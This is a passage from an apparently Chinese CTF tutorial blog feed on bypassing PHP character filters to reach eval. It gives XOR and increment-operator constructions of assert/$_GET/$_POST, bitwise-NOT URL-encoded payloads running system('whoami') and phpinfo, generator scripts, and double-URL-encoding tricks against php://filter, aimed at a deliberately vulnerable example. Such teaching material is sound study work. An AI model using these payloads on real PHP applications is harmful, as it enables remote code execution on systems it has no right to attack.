class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:])<span class="hljs-comment">#百分号代表url编码</span><br>                j = <span class="hljs-string">&#x27;%&#123;:0&gt;2&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(j)[<span class="hljs-number">2</span>:])<span class="hljs-comment">#2：表示切片操作</span><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;(&#x27;&#123;0&#125;&#x27;^&#x27;&#123;1&#125;&#x27;)&quot;</span>.<span class="hljs-built_in">format</span>(i,j),end=<span class="hljs-string">&quot;.&quot;</span>)<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure><p>一次代码执行只能得到我们想要执行语句的字符串，并不能执行语句，所以需要执行两次代码执行，构造</p><blockquote><p>当使用格式化字符串时，<code>&#123;:0&gt;2&#125;</code> 表示将要插入的值按照指定格式进行输出。具体地说，这个格式化字符串的含义是：</p><ul><li><code>:</code> 表示格式说明符的开始。</li><li><code>0</code> 表示使用数字 0 作为填充字符。</li><li><code>&gt;</code> 表示将值右对齐。</li><li><code>2</code> 表示总长度为 2。</li></ul><p>例如，如果要将整数 1 格式化为 2 位的字符串，可以使用以下代码：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pythonCopy</span> codes = &#x27;&#123;:<span class="hljs-number">0</span>&gt;<span class="hljs-number">2</span>&#125;&#x27;.format(<span class="hljs-number">1</span>)<br><span class="hljs-attribute">print</span>(s)  # 输出：<span class="hljs-number">01</span><br></code></pre></td></tr></table></figure><p>这里，<code>1</code> 被转换为字符串 <code>&#39;1&#39;</code>，然后使用 <code>&#39;0&#39;</code> 字符作为填充字符，在字符串的左侧填充，使得字符串的总长度为 2。</p><p>类似地，如果要将整数 10 格式化为 2 位的字符串，可以使用以下代码：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pythonCopy</span> codes = &#x27;&#123;:<span class="hljs-number">0</span>&gt;<span class="hljs-number">2</span>&#125;&#x27;.format(<span class="hljs-number">10</span>)<br><span class="hljs-attribute">print</span>(s)  # 输出：<span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><p>在这个例子中，整数 <code>10</code> 被转换为字符串 <code>&#39;10&#39;</code>，因为它的长度已经是 2，所以不需要填充任何字符。</p><p>在上面的代码中，<code>&#123;:0&gt;2&#125;</code> 用于将整数转换为 2 位的十六进制字符串，并在前面添加 <code>%</code> 符号。例如，如果整数是 10，则转换后的字符串为 <code>%0a</code>。由于要保证字符串的总长度为 2，因此使用了 <code>&#123;:0&gt;2&#125;</code> 格式化字符串来进行格式化。</p></blockquote><blockquote><p>在这个代码中，<code>2:</code> 是一个切片操作，用于获取从 <code>hex(i)</code> 返回的字符串中第 2 个字符开始的子字符串。</p><p>具体来说，<code>hex(i)</code> 将整数 <code>i</code> 转换为十六进制字符串，例如，<code>hex(10)</code> 返回字符串 <code>&#39;0xa&#39;</code>。然后，<code>[2:]</code> 将从字符串的第 2 个字符开始的子字符串提取出来，例如，<code>&#39;a&#39;</code>。最后，使用 <code>&#39;&#123;:0&gt;2&#125;&#39;</code> 格式化字符串将字符 <code>&#39;a&#39;</code> 转换为一个 2 位的十六进制字符串，例如，<code>&#39;%0a&#39;</code>。</p><p>因此，<code>i = &#39;%&#123;:0&gt;2&#125;&#39;.format(hex(i)[2:])</code> 的作用是将整数 <code>i</code> 转换为 URL 编码的字符串。该字符串的格式为 <code>%</code> 后跟两个十六进制数字，并使用前导零进行填充。例如，如果整数 <code>i</code> 的值为 10，则上述代码将将 <code>i</code> 转换为字符串 <code>%0a</code>。这个字符串可以用于构造 HTTP 请求的 URL 参数或路径参数。</p></blockquote><p>比如说我们想执行这个语句</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">assert</span>($_GET[_]);<br></code></pre></td></tr></table></figure><p>先转换assert</p><p><img src="D:/mdimage/image-20220928205111449.png" alt="image-20220928205111449"> </p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">(&#x27;<span class="hljs-variable">%01</span>&#x27;^&#x27;<span class="hljs-variable">%60</span>&#x27;).(&#x27;<span class="hljs-variable">%08</span>&#x27;^&#x27;<span class="hljs-variable">%7</span>b&#x27;).(&#x27;<span class="hljs-variable">%08</span>&#x27;^&#x27;<span class="hljs-variable">%7</span>b&#x27;).(&#x27;<span class="hljs-variable">%05</span>&#x27;^&#x27;<span class="hljs-variable">%60</span>&#x27;).(&#x27;<span class="hljs-variable">%09</span>&#x27;^&#x27;<span class="hljs-variable">%7</span>b&#x27;).(&#x27;<span class="hljs-variable">%08</span>&#x27;^&#x27;<span class="hljs-variable">%7</span><span class="hljs-keyword">c</span>&#x27;).<br></code></pre></td></tr></table></figure><p>因为前面这一个题目过滤掉了全部的字母，因此此时能够做变量的字符是剩下了<code>_</code>,于是我们便需要用下划线构造参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_</span>=(<span class="hljs-string">&#x27;%01&#x27;</span>^<span class="hljs-string">&#x27;%60&#x27;</span>).(<span class="hljs-string">&#x27;%08&#x27;</span>^<span class="hljs-string">&#x27;%7b&#x27;</span>).(<span class="hljs-string">&#x27;%08&#x27;</span>^<span class="hljs-string">&#x27;%7b&#x27;</span>).(<span class="hljs-string">&#x27;%05&#x27;</span>^<span class="hljs-string">&#x27;%60&#x27;</span>).(<span class="hljs-string">&#x27;%09&#x27;</span>^<span class="hljs-string">&#x27;%7b&#x27;</span>).(<span class="hljs-string">&#x27;%08&#x27;</span>^<span class="hljs-string">&#x27;%7c&#x27;</span>);<br><span class="hljs-comment">//$_=&#x27;assert&#x27;;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$__</span>=<span class="hljs-string">&#x27;_&#x27;</span>.(<span class="hljs-string">&#x27;%07&#x27;</span>^<span class="hljs-string">&#x27;%40&#x27;</span>).(<span class="hljs-string">&#x27;%05&#x27;</span>^<span class="hljs-string">&#x27;%40&#x27;</span>).(<span class="hljs-string">&#x27;%09&#x27;</span>^<span class="hljs-string">&#x27;%5d&#x27;</span>);<br><span class="hljs-comment">//$__=&#x27;_GET&#x27;;</span><br></code></pre></td></tr></table></figure><p>先把两个基础函数构造出来</p><p>然后再构造完整的$_GET</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$___</span>=<span class="hljs-variable">$$__</span>;<br><span class="hljs-comment">//$___=&#x27;$_GET&#x27;;</span><br><span class="hljs-variable">$_</span>(<span class="hljs-variable">$___</span>[_]);<br><span class="hljs-comment">//assert($_GET[_]);</span><br></code></pre></td></tr></table></figure><p>然后我们直接将上述构造的参数全部连接起来</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_</span>=(<span class="hljs-string">&#x27;%01&#x27;</span>^<span class="hljs-string">&#x27;%60&#x27;</span>).(<span class="hljs-string">&#x27;%08&#x27;</span>^<span class="hljs-string">&#x27;%7b&#x27;</span>).(<span class="hljs-string">&#x27;%08&#x27;</span>^<span class="hljs-string">&#x27;%7b&#x27;</span>).(<span class="hljs-string">&#x27;%05&#x27;</span>^<span class="hljs-string">&#x27;%60&#x27;</span>).(<span class="hljs-string">&#x27;%09&#x27;</span>^<span class="hljs-string">&#x27;%7b&#x27;</span>).(<span class="hljs-string">&#x27;%08&#x27;</span>^<span class="hljs-string">&#x27;%7c&#x27;</span>);<span class="hljs-variable">$__</span>=<span class="hljs-string">&#x27;_&#x27;</span>.(<span class="hljs-string">&#x27;%07&#x27;</span>^<span class="hljs-string">&#x27;%40&#x27;</span>).(<span class="hljs-string">&#x27;%05&#x27;</span>^<span class="hljs-string">&#x27;%40&#x27;</span>).(<span class="hljs-string">&#x27;%09&#x27;</span>^<span class="hljs-string">&#x27;%5d&#x27;</span>);<span class="hljs-variable">$___</span>=<span class="hljs-variable">$$__</span>;<span class="hljs-variable">$_</span>(<span class="hljs-variable">$___</span>[_]);&amp;_=<span class="hljs-title function_ invoke__">phpinfo</span>();<br><br></code></pre></td></tr></table></figure><h3 id="方法二（利用自增运算符）"><a href="#方法二（利用自增运算符）" class="headerlink" title="方法二（利用自增运算符）"></a>方法二（利用自增运算符）</h3><p>倘若把位运算符去掉了，岂不是没有办法执行命令了？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-string">&quot;On&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL | E_STRICT);<br><span class="hljs-variable">$_POST</span>[__] = <span class="hljs-string">&#x27;system&#x27;</span>;<br><span class="hljs-variable">$_POST</span>[_] = <span class="hljs-string">&#x27;dir&#x27;</span>;<br><span class="hljs-variable">$_</span>=[].<span class="hljs-string">&#x27;&#x27;</span>;   <span class="hljs-comment">//得到&quot;Array&quot;</span><br><span class="hljs-variable">$___</span> = <span class="hljs-variable">$_</span>[<span class="hljs-variable">$__</span>];   <span class="hljs-comment">//得到&quot;A&quot;，$__没有定义，默认为False也即0，此时$___=&quot;A&quot;</span><br><span class="hljs-variable">$__</span> = <span class="hljs-variable">$___</span>;   <span class="hljs-comment">//$__=&quot;A&quot;</span><br><span class="hljs-variable">$_</span> = <span class="hljs-variable">$___</span>;   <span class="hljs-comment">//$_=&quot;A&quot;</span><br><span class="hljs-variable">$____</span> = <span class="hljs-string">&quot;_&quot;</span>;   <span class="hljs-comment">//$____=&quot;_&quot;</span><br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;   <span class="hljs-comment">//得到&quot;P&quot;，此时$__=&quot;P&quot;</span><br><span class="hljs-variable">$____</span> .= <span class="hljs-variable">$__</span>;   <span class="hljs-comment">//$____=&quot;_P&quot;</span><br><span class="hljs-variable">$__</span> = <span class="hljs-variable">$_</span>;   <span class="hljs-comment">//$__=&quot;A&quot;</span><br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;   <span class="hljs-comment">//得到&quot;O&quot;，此时$__=&quot;O&quot;</span><br><span class="hljs-variable">$____</span> .= <span class="hljs-variable">$__</span>;   <span class="hljs-comment">//$____=&quot;_PO&quot;</span><br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;   <span class="hljs-comment">//得到&quot;S&quot;，此时$__=&quot;S&quot;</span><br><span class="hljs-variable">$____</span> .= <span class="hljs-variable">$__</span>;   <span class="hljs-comment">//$____=&quot;_POS&quot;</span><br><span class="hljs-variable">$__</span>++;   <span class="hljs-comment">//得到&quot;T&quot;，此时$__=&quot;T&quot;</span><br><span class="hljs-variable">$____</span> .= <span class="hljs-variable">$__</span>;   <span class="hljs-comment">//$____=&quot;_POST&quot;</span><br><span class="hljs-variable">$_</span> = <span class="hljs-variable">$$____</span>;   <span class="hljs-comment">//$_=$_POST</span><br><span class="hljs-variable">$_</span>[__](<span class="hljs-variable">$_</span>[_]);   <span class="hljs-comment">//—</span><br></code></pre></td></tr></table></figure><p>或者像下面这样</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$_1</span>=[].[];<span class="hljs-regexp">//</span>得到一个array字符串<br><span class="hljs-variable">$_</span>= <span class="hljs-variable">$_1</span>[<span class="hljs-number">0</span>];<span class="hljs-regexp">//</span>得到a，就是<span class="hljs-variable">$_</span>是a<br>++<span class="hljs-variable">$_</span>;<span class="hljs-regexp">//</span>得到b<br><span class="hljs-variable">$_2</span>=++<span class="hljs-variable">$_</span>;<span class="hljs-regexp">//</span>得到c<br>++<span class="hljs-variable">$_</span>;<br>++<span class="hljs-variable">$_</span>;<br>++<span class="hljs-variable">$_</span>;<br>++<span class="hljs-variable">$_</span>;<span class="hljs-regexp">//</span><br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$_2</span>.++<span class="hljs-variable">$_</span>.<span class="hljs-variable">$_1</span>[<span class="hljs-number">1</span>];<span class="hljs-regexp">//</span>chr<br><br><span class="hljs-variable">$_</span>=_.<span class="hljs-variable">$_</span>(<span class="hljs-number">71</span>).<span class="hljs-variable">$_</span>(<span class="hljs-number">69</span>).<span class="hljs-variable">$_</span>(<span class="hljs-number">84</span>);<span class="hljs-regexp">//</span>chr里面的_get<br>$<span class="hljs-variable">$_</span>&#123;<span class="hljs-number">1</span>&#125;($<span class="hljs-variable">$_</span>&#123;<span class="hljs-number">2</span>&#125;);<br><br></code></pre></td></tr></table></figure><h2 id="当过滤字符较少时"><a href="#当过滤字符较少时" class="headerlink" title="当过滤字符较少时"></a>当过滤字符较少时</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> string<br><br>char = string.printable<br>cmd = <span class="hljs-string">&#x27;system&#x27;</span><br>tmp1,tmp2 = <span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> res <span class="hljs-keyword">in</span> cmd:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> char:<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> char:<br>            <span class="hljs-keyword">if</span>(<span class="hljs-built_in">ord</span>(i)^<span class="hljs-built_in">ord</span>(j) == <span class="hljs-built_in">ord</span>(res)):<br>                tmp1 += i<br>                tmp2 += j<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;(&#x27;&#123;&#125;&#x27;^&#x27;&#123;&#125;&#x27;)&quot;</span>.<span class="hljs-built_in">format</span>(tmp1,tmp2))<br><br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">PS C:\Users\Administrator&gt; php -r <span class="hljs-string">&quot;var_dump(&#x27;000000&#x27;^&#x27;CICDU]&#x27;);&quot;</span><br>Command line code:1:<br>string(6) <span class="hljs-string">&quot;system&quot;</span><br><br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/image-20220928225744164.png" alt="image-20220928225744164"> </p><h2 id="另一个payload"><a href="#另一个payload" class="headerlink" title="另一个payload"></a>另一个payload</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo<br><span class="hljs-comment">//$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br></code></pre></td></tr></table></figure><p>通过他们之间异或来获得</p><h1 id="URL编码取反绕过"><a href="#URL编码取反绕过" class="headerlink" title="URL编码取反绕过"></a>URL编码取反绕过</h1><p>适用PHP版本：当<code>PHP&gt;=7</code>时，可以直接利用取反构造payload</p><p>还是用这一道例题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z0-9]/is&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]))&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker!!&quot;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="无参数payload"><a href="#无参数payload" class="headerlink" title="无参数payload"></a>无参数payload</h2><p>我们直接进行取反操作</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-string">&#x27;phpinfo&#x27;</span>));<br><br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/image-20220928230641649.png" alt="image-20220928230641649"> </p><h2 id="有参数payload"><a href="#有参数payload" class="headerlink" title="有参数payload"></a>有参数payload</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-string">&#x27;system&#x27;</span>));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-string">&#x27;whoami&#x27;</span>));<br><br><span class="hljs-comment">//结果如下：</span><br><span class="hljs-keyword">string</span>(<span class="hljs-number">18</span>) <span class="hljs-string">&quot;%8C%86%8C%8B%9A%92&quot;</span> <span class="hljs-keyword">string</span>(<span class="hljs-number">18</span>) <span class="hljs-string">&quot;%88%97%90%9E%92%96&quot;</span><br></code></pre></td></tr></table></figure><p>最终payload</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">(~<span class="hljs-variable">%8</span>C<span class="hljs-variable">%86</span><span class="hljs-variable">%8</span>C<span class="hljs-variable">%8</span>B<span class="hljs-variable">%9</span>A<span class="hljs-variable">%92</span>)(~<span class="hljs-variable">%88</span><span class="hljs-variable">%97</span><span class="hljs-variable">%90</span><span class="hljs-variable">%9</span>E<span class="hljs-variable">%92</span><span class="hljs-variable">%96</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><img src="D:/mdimage/image-20220929160845063.png" alt="image-20220929160845063"> </p><h2 id="URL双写绕过"><a href="#URL双写绕过" class="headerlink" title="URL双写绕过"></a>URL双写绕过</h2><h3 id="最简单的考法"><a href="#最简单的考法" class="headerlink" title="最简单的考法"></a>最简单的考法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;flag&#123;xxxx&#125;&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/hackerDJ/&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;not allowed&quot;</span>;<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$id</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$id</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;hackerDJ&quot;</span> == <span class="hljs-variable">$id</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>因为在提交的时候服务器会对url进行一次解码，所以我们需要双写绕过</p><p>但是我们一般不会考这么简单的</p><h3 id="file-put-content"><a href="#file-put-content" class="headerlink" title="file_put_content"></a>file_put_content</h3><p>先查这玩意的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_ invoke__">php_stream_apply_filter_list</span>(php_stream *stream, char *filterlist, <span class="hljs-keyword">int</span> read_chain, <span class="hljs-keyword">int</span> write_chain) <span class="hljs-comment">/* &#123;&#123;&#123; */</span><br>&#123;<br>char *p, *token = <span class="hljs-literal">NULL</span>;<br>php_stream_filter *temp_filter;<br><br>p = <span class="hljs-title function_ invoke__">php_strtok_r</span>(filterlist, <span class="hljs-string">&quot;|&quot;</span>, &amp;token);<br><span class="hljs-keyword">while</span> (p) &#123;<br><span class="hljs-title function_ invoke__">php_url_decode</span>(p, <span class="hljs-title function_ invoke__">strlen</span>(p));<span class="hljs-comment">#👈对过滤器进行了一次urldecode</span><br><span class="hljs-keyword">if</span> (read_chain) &#123;<br><span class="hljs-keyword">if</span> ((temp_filter = <span class="hljs-title function_ invoke__">php_stream_filter_create</span>(p, <span class="hljs-literal">NULL</span>, <span class="hljs-title function_ invoke__">php_stream_is_persistent</span>(stream)))) &#123;<br><span class="hljs-title function_ invoke__">php_stream_filter_append</span>(&amp;stream-&gt;readfilters, temp_filter);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-title function_ invoke__">php_error_docref</span>(<span class="hljs-literal">NULL</span>, E_WARNING, <span class="hljs-string">&quot;Unable to create filter (%s)&quot;</span>, p);<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (write_chain) &#123;<br><span class="hljs-keyword">if</span> ((temp_filter = <span class="hljs-title function_ invoke__">php_stream_filter_create</span>(p, <span class="hljs-literal">NULL</span>, <span class="hljs-title function_ invoke__">php_stream_is_persistent</span>(stream)))) &#123;<br><span class="hljs-title function_ invoke__">php_stream_filter_append</span>(&amp;stream-&gt;writefilters, temp_filter);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-title function_ invoke__">php_error_docref</span>(<span class="hljs-literal">NULL</span>, E_WARNING, <span class="hljs-string">&quot;Unable to create filter (%s)&quot;</span>, p);<br>&#125;<br>&#125;<br>p = <span class="hljs-title function_ invoke__">php_strtok_r</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;|&quot;</span>, &amp;token);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>所以我们可以双写绕过</p><p>但是一般服务器会把我们那么简单的绕过给ban掉</p><p>所以我们可以用下面这个脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$char</span> = <span class="hljs-string">&#x27;r&#x27;</span>; <span class="hljs-comment">#构造r的二次编码</span><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$ascii1</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$ascii1</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$ascii1</span>++) &#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$ascii2</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$ascii2</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$ascii2</span>++) &#123;<br><span class="hljs-variable">$aaa</span> = <span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$ascii1</span>.<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$ascii2</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$aaa</span>)) == <span class="hljs-variable">$char</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$char</span>.<span class="hljs-string">&#x27;: &#x27;</span>.<span class="hljs-variable">$aaa</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>比如原来是</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/write=string.rot13|cuc cucvasb();|/</span>resource=Cyc1e.php<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">r</span>: %<span class="hljs-number">7</span>%<span class="hljs-number">32</span><br></code></pre></td></tr></table></figure><p>根据重编码的结果替换r</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/write=string.%7%32ot13|cuc cucvasb();|/</span>resource=Cyc1e.php<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>PHP PCRE</title>
